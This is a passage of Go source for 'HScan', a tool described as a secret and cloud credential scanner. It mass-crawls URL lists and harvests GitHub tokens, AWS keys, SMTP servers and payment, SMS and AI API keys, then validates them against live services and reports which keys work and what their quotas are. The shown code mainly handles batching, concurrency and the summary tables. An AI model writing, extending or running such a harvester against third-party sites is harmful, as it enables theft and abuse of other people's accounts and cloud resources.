		tokenSuccessRate = float64(globalCounters.TokensValidated) / float64(globalCounters.TokensHarvested) * 100
	}

	data := [][]string{
		{"Metric", "Count", "Status"},
		{"URLs Loaded", pterm.Cyan(globalCounters.URLsLoaded), ""},
		{"Tokens Harvested", pterm.Yellow(globalCounters.TokensHarvested), ""},
		{"Tokens Validated (GitHub)", pterm.Green(globalCounters.TokensValidated), pterm.Bold.Sprintf("(%.2f%% Success)", tokenSuccessRate)},
		{"🔥 Deep Secrets Found (Crypto/GitScan)", pterm.FgLightRed.Sprint(globalCounters.CryptoKeysFound), "Surgical Precision"},
		{"☁️ Valid AWS Keys", pterm.FgLightCyan.Sprint(globalCounters.AWSKeysValidated), "Deep Audit Success"},
		{"Total API Keys Found", pterm.Magenta(globalCounters.APIsFoundTotal), ""},
		{"API Keys Validated (Mail/SMS/Payment/AI/GCP)", pterm.Green(globalCounters.APIsValidated), pterm.Bold.Sprintf("(%.2f%% Success)", apiSuccessRate)},
		{"Valid SMTP Servers", pterm.FgLightGreen.Sprint(globalCounters.ValidSMTP), ""},
	}
	pterm.DefaultTable.WithHasHeader().WithData(data).Render()

	pterm.Println()

	pterm.FgGreen.Println("# ✅ Valid Keys & Control Limits")

	limitData := [][]string{{"Type", "Key (Masked)", "Limit/Quota"}}

	a.ValidKeyLimits.Range(func(key, value interface{}) bool {
		keyStr := key.(string)
		limitStr := value.(string)
		parts := strings.Split(keyStr, ":")
		if len(parts) >= 2 {
			keyType := parts[0]
			keyVal := parts[1]
			limitData = append(limitData, []string{pterm.NewStyle(pterm.Bold).Sprint(keyType), pterm.Cyan(keyVal), pterm.Green(limitStr)})
		}
		return true
	})

	if len(limitData) > 1 {
		pterm.DefaultTable.WithHasHeader().WithData(limitData).Render()
	} else {
		pterm.Info.Println("No API keys with observable limits were validated and stored.")
	}

	pterm.FgGreen.Println("\n======== ALL PROCESSES COMPLETED! ========")
}

func renderBanner() {
	pterm.DefaultBigText.WithLetters(
		pterm.NewLettersFromStringWithStyle("HSCAN", pterm.NewStyle(pterm.FgCyan)),
	).Render()
	pterm.DefaultCenter.Println(pterm.LightWhite("HScan — Secret & Cloud Credential Scanner"))
	pterm.Println()
}

func interactiveMode() string {
	renderBanner()
	targetFile, _ := pterm.DefaultInteractiveTextInput.Show("Enter list file path (URLs)")
	if targetFile == "" {
		pterm.Error.Println("File path cannot be empty.")
		os.Exit(1)
	}
	return targetFile
}

func (a *AWSScanner) processBatch(urls []string) {
	var wg sync.WaitGroup
	sem := make(chan struct{}, 1000)

	for _, u := range urls {
		wg.Add(1)
		sem <- struct{}{}
		go func(url string) {
			defer wg.Done()
			a.createRequest(url)
			<-sem
			if a.ProgressBar != nil {
				a.ProgressBar.Increment()
			}
		}(u)
	}
	wg.Wait()
}

func (a *AWSScanner) runBatched(listFile string) {
	renderBanner()

	pterm.Info.Println("Calculating total lines for progress bar...")
	totalLines, err := countLines(listFile)
	if err != nil {
		pterm.Error.Printfln("Failed to count lines: %v", err)
		os.Exit(1)
	}

	pterm.Info.Printfln("Total targets: %d. Batch size: %d. Timeout: %ds.", totalLines, batchSize, requestTimeoutSeconds)
	globalCounters.URLsLoaded = totalLines

	a.ProgressBar, _ = pterm.DefaultProgressbar.
		WithTotal(totalLines).
		WithTitle("Scanning Targets (Batched)").
		WithShowCount().
		WithShowElapsedTime().
		Start()

	file, err := os.Open(listFile)
	if err != nil {
		pterm.Error.Printfln("Could not open file '%s': %v", listFile, err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var batch []string

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		batch = append(batch, line)

		if len(batch) >= batchSize {
			a.processBatch(batch)

			batch = nil

			runtime.GC()
		}
	}

	if len(batch) > 0 {
		a.processBatch(batch)
		batch = nil
		runtime.GC()
	}

	if err := scanner.Err(); err != nil {
		pterm.Error.Printfln("Error reading file: %v", err)
	}

	a.ProgressBar.Stop()
	a.DisplaySummary()
}

func main() {
	flag.IntVar(&requestTimeoutSeconds, "timeout", 20, "Global timeout for each HTTP request in seconds.")
	flag.IntVar(&batchSize, "batch", 500000, "Number of URLs to process per batch before forcing GC.")

	var tokenListFile string
	flag.StringVar(&tokenListFile, "tokenlist", "", "Path to a file containing a list of GitHub tokens (one per line).")

	flag.Parse()

	var listFile string
	listArgs := flag.Args()

	scanner := NewAWSScanner(defaultConfigPath)

	if tokenListFile != "" {
		scanner.ProcessTokenList(tokenListFile)
		scanner.DisplaySummary()
		return
	}

	if len(listArgs) < 1 {
		listFile = interactiveMode()
	} else {
		listFile = listArgs[0]
	}

	if _, err := os.Stat(listFile); os.IsNotExist(err) {
		pterm.Error.Printfln("File '%s' not found.", listFile)
		os.Exit(1)
	}

	mainClient := &http.Client{
		Timeout: time.Duration(requestTimeoutSeconds) * time.Second,
	}

	enhancer := NewEnhancer(mainClient)
	enhancer.EnhanceScanner(scanner)

	f, err := os.Open(listFile)
	if err == nil {
		sc := bufio.NewScanner(f)
		if sc.Scan() {
			firstURL := strings.TrimSpace(sc.Text())
			go enhancer.CrawlAndExtract(firstURL, 2, scanner)
			pterm.Info.Println("Enhancer pre-scan activated for:", firstURL)
		}
		f.Close()
	}

	scanner.runBatched(listFile)
}